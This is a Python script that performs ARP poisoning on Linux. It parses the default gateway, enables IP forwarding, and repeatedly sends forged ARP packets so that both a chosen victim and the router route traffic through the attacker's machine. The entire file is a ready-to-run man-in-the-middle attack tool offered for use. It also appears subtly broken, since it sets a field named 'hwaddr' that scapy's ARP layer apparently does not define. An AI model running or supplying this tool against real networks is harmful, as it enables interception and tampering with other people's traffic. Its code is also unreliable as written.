'''
Author: Jake Wachs
Aug 2020

A linux script for ARP Poisoning
'''

import re
import os
import sys
import subprocess
from subprocess import Popen, PIPE
import scapy.all as scap
from getmac import get_mac_address

def extractIP(line):
	'''
	Gets the IP address from a line of text

	Keyword Arguments:
	line - line of text provided via readline() method

	return - IP address
	'''
	ip = re.findall(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', line)

	if len(ip) < 1:
		print('No default IP address could be found')		# FIXME: print to stderr
		exit(-1)

	return ip[0]


def getDefaultGateway(output):
	'''
	Gets the IP address of the default gateway via parsing

	Keyword Arguments:
	output - A BufferedReader object; the output of the ip tool

	return - IP of default gateway
	'''
	currLine = output.stdout.readline().decode('utf-8')
	while currLine:
		if 'default' in currLine:
			return extractIP(currLine)

		currLine = output.stdout.readline().decode('utf-8')


def enablePortForwarding():
	'''
	Enables port forwarding on the local, attacking machine
	'''
	subprocess.call(['sysctl', '-w', 'net.ipv4.ip_forward=1'])


if __name__ == '__main__':
	if len(sys.argv) < 2:
		print('Usage: sudo python3 arpPoison.py <target_IP_address>')
		print('[*] sudo privileges required for modification of port forwarding')
		exit(-1)
	else:
		victim_ip = sys.argv[1]

		p = Popen(['ip', 'r'], stdin=PIPE, stdout=PIPE, stderr=PIPE)
		try:
			gateway_ip = getDefaultGateway(p)
		except:
			print('No default gateway could be found')		# FIXME: print to stderr
			exit(-1)

		attacker_mac = get_mac_address()	

		enablePortForwarding()	
		
		print('[*] Beginning ARP poison')
		while True:
			# Telling the victim 'I am the router'
			vic_packet = scap.ARP(op=1, pdst=victim_ip, hwaddr=attacker_mac, psrc=gateway_ip)
			scap.send(vic_packet)

			# Telling the router 'I am the victim'
			router_packet = scap.ARP(op=1, pdst=gateway_ip, hwaddr=attacker_mac, psrc=victim_ip)
			scap.send(router_packet)
